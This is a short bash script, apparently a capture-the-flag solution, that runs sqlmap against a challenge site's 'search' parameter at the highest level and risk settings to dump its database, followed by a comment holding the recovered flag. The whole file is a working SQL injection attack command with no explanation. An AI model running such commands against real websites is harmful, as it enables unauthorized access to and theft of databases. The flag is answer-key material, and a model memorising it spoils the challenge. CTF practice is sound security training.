#!/bin/bash

sqlmap -u http://president.sctf.michaelz.xyz/ --data='search=*' -p search --random-agent --level=5 --risk=3 --dump --technique=QBT -o --flush-session --threads 1

# sctf{why_do_people_still_make_sites_like_this}
